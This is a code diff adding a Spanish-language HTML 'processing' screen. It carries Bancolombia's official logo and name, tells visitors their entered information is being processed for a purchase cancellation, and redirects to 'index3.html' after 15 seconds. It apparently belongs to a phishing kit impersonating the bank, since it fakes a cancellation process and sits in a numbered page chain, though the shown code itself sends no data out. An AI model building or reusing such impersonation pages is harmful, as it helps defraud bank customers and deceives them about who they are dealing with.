@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pantalla de procesamiento</title>
+
+  <!-- Tipografías modernas -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700&family=Poppins:wght@600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --ink:#111;
+      --muted:#555;
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      background:#fff;
+      color:var(--ink);
+      font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-size: clamp(16px, 1.8vw, 18px);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    .wrap{
+      width:min(720px, 92vw);
+      text-align:center;
+      padding: clamp(16px, 4vw, 40px) 0;
+    }
+
+    /* Logo superior */
+    .logo img{
+      max-width:320px;
+      width:100%;
+      height:auto;
+      margin-bottom: clamp(36px, 6vh, 64px);
+    }
+
+    /* Mensaje principal */
+    h1{
+      margin:0 0 clamp(36px, 6vh, 64px);
+      font-family:"Poppins","Inter",sans-serif;
+      font-weight:600;
+      font-size: clamp(22px, 3.4vw, 32px);
+    }
+
+    /* Espacio para GIF */
+    .gif{
+      margin:0 auto clamp(36px, 6vh, 56px);
+    }
+
+    .gif img{
+      max-width:280px;
+      width:100%;
+      height:auto;
+    }
+
+    .note{
+      color:var(--muted);
+      line-height:1.5;
+      font-weight:600;
+    }
+
+    .brand{
+      margin-top:10px;
+      font-weight:700;
+      letter-spacing:.2px;
+    }
+
+    /* Animación */
+    .fade-up{opacity:0; transform:translateY(8px); animation:fadeUp .6s ease forwards}
+    .fade-up.d2{animation-delay:.08s}
+    .fade-up.d3{animation-delay:.16s}
+    .fade-up.d4{animation-delay:.24s}
+
+    @keyframes fadeUp{
+      to{opacity:1; transform:none}
+    }
+
+    @media (prefers-reduced-motion: reduce){
+      .fade-up{animation:none; opacity:1; transform:none}
+    }
+  </style>
+</head>
+<body>
+  <main class="wrap">
+    <!-- Logo oficial -->
+    <div class="logo fade-up">
+      <img src="https://library-sdb.apps.bancolombia.com/bds/7.31.14/assets/icons/logos/bancolombia-horizontal-no-spacing.svg" alt="Bancolombia">
+    </div>
+
+    <h1 class="fade-up d2">Estamos procesando su información ingresada</h1>
+
+    <!-- GIF animado -->
+    <div class="gif fade-up d3">
+      <img src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/8c3994152005995.631a697736de0.gif" alt="Procesando...">
+    </div>
+
+    <p class="note fade-up d4">Estamos iniciando el proceso de cancelación de compra…</p>
+    <p class="brand fade-up d4">Bancolombia S.A.</p>
+  </main>
+
+  <script>
+    // Después de 15s redirige (ajusta la URL de destino si deseas)
+    setTimeout(() => {
+      window.location.href = "index3.html";
+    }, 15000);
+  </script>
+</body>
+</html>
